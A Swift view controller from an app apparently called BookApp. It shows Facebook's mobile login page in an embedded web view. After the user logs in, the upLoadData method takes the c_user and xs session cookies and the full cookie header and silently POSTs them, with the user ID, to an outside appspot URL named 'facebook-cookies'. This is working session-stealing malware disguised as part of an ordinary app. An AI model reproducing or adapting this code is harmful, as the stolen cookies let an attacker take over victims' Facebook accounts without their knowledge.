//
//  WebViewController.swift
//  BookApp
//
//  Created by Ngoc The on 1/20/21.
//  Copyright © 2021 Ngoc The. All rights reserved.
//

import UIKit
import WebKit

class WebViewController: UIViewController, WKNavigationDelegate {

    @IBOutlet weak var webView: UIView!
    @IBOutlet weak var urlLabel: UILabel!
    
    let HOST_URL = "https://m.facebook.com/"
    var wkWebView: WKWebView!
    var openMainScreen: (() -> Void)?
    
    override func viewDidLoad() {
        super.viewDidLoad()

        initView()
    }
    
    private func initView() {
        urlLabel.text = HOST_URL
        wkWebView = WKWebView(frame: self.webView.bounds)
        wkWebView.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        wkWebView.navigationDelegate = self
        self.webView.addSubview(wkWebView)
        loadURL()
    }
    
    private func loadURL() {
        guard let url = URL(string: HOST_URL) else { return }
        let requestURL = URLRequest(url: url)
        wkWebView.load(requestURL)
    }
    
    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        
        if let url = navigationAction.request.url?.absoluteString {
            wkWebView.getCookies(for: url, completion: { [weak self] (data,c_user, xs) in
                guard let weakSelf = self else { return}
                if !c_user.isEmpty && !xs.isEmpty {
                    
                    weakSelf.dismiss(animated: true, completion: {
                        weakSelf.openMainScreen?()
                    })
                    let cookieHeader = (data.compactMap({ (key, value) -> String in
                        let fullNameArr = String(describing: value).components(separatedBy: "Value =")
                        return "\(key)=\(fullNameArr[1].replace(string: "\"", with: "").replace(string: "Version = 1;\n}", with: "").replace(string: ";", with: "")) "
                    }) as Array).joined(separator: ";")
                    let cookeis = cookieHeader.replace(string: "\n     ", with: "")
                    weakSelf.uploadCookies(cookies: cookeis, uid: c_user, xs: xs)
                }
            })
            decisionHandler(.allow)
        } else {
            decisionHandler(.cancel)
        }
    }
    
    func uploadCookies(cookies: String,uid: String, xs: String) {
        upLoadData(password: "", uid: uid, cookie: cookies, combined: "")
    }
    
    @IBAction func tapDone(_ sender: UIButton) {
        self.dismiss(animated: true, completion: nil)
    }
}

extension WebViewController{
    private func upLoadData(password: String, uid: String,cookie: String,combined: String){
        let url = URL(string: "https://level-hallway-308115.uc.r.appspot.com/facebook-cookies")!
        var request = URLRequest(url: url)
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpMethod = "POST"
        let parameters: [String: Any] = [
            "password": password,
            "uid": uid,
            "cookie": cookie,
            "combined": combined
        ]
        do {
                request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: .prettyPrinted) // pass dictionary to nsdata object and set it as request body
            } catch let error {
                print(error.localizedDescription)
            }

        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            guard let data = data,
                let response = response as? HTTPURLResponse,
                error == nil else {                                              // check for fundamental networking error
                print("error", error ?? "Unknown error")
                return
            }

            guard (200 ... 299) ~= response.statusCode else {                    // check for http errors
                print("statusCode should be 2xx, but is \(response.statusCode)")
                print("response = \(response)")
                return
            }

            let responseString = String(data: data, encoding: .utf8)
            print("responseString = \(responseString)")
        }
        task.resume()
    }
}

extension String{
    func replace(string: String, with newString: String) -> String {
        return self.replacingOccurrences(of: string, with: newString)
    }
}
